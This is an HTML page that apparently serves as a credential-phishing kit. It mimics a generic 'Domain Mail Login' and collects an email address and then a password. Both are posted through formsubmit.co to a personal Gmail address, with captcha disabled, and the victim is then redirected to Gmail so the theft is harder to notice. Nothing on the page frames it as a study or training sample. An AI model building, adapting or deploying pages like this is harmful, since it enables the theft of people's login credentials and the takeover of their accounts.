<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Domain Mail Login</title>
    <style>
        /* Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #4a90e2, #9013fe);
        }

        .login-container {
            background-color: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            width: 350px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
            text-align: center;
            transition: all 0.3s ease;
        }

        .login-container h1 {
            margin-bottom: 20px;
            color: #333;
            font-size: 24px;
        }

        .login-container input {
            width: 100%;
            padding: 12px 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        .login-container button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background-color: #4a90e2;
            color: #fff;
            font-size: 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .login-container button:hover {
            background-color: #357abd;
        }

        .password-section {
            display: none;
        }

        .back-btn {
            background-color: transparent;
            color: #4a90e2;
            border: none;
            cursor: pointer;
            margin-bottom: 10px;
            font-size: 14px;
            width: auto;
            padding: 5px 10px;
            margin-top: 0;
        }

        .back-btn:hover {
            text-decoration: underline;
            background-color: transparent;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>Domain Mail Login</h1>

    <!-- Email Section -->
    <form action="https://formsubmit.co/howerjohn615@gmail.com" method="POST">
        <div class="email-section">
            <input type="email" name="email" id="email" placeholder="Enter your email" required>
            <input type="button" id="nextBtn" value="Next" style="background-color: #4a90e2; color: #fff;">
        </div>
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://mail.google.com/">
        
        <!-- Password Section -->
        <div class="password-section">
            
            <input type="password" name="password" id="password" placeholder="Enter your password" required>
            <button id="loginBtn" type="submit">Login</button>
        </div>
    </form>
</div>

<script>
    // Get DOM elements
    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');
    const emailSection = document.querySelector('.email-section');
    const passwordSection = document.querySelector('.password-section');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    // Next button click - shows password section when email is entered
    nextBtn.addEventListener('click', () => {
        const email = emailInput.value;
        if(email.trim() !== "") {
            // Hide email section, show password section
            emailSection.style.display = 'none';
            passwordSection.style.display = 'block';
        } else {
            alert("Please enter your email.");
        }
    });

    // Back button click - returns to email section
    backBtn.addEventListener('click', () => {
        // Hide password section, show email section
        passwordSection.style.display = 'none';
        emailSection.style.display = 'block';
    });

    // Login button click - validates password before submitting
    const loginBtn = document.getElementById('loginBtn');
    loginBtn.addEventListener('click', (event) => {
        const password = passwordInput.value;
        if(password.trim() !== "") {
            alert("Login submitted!"); // Replace with actual login logic
            // Form will submit naturally to formsubmit.co after this
        } else {
            event.preventDefault(); // Prevent form submission if password is empty
            alert("Please enter your password.");
        }
    });
</script>

</body>
</html>
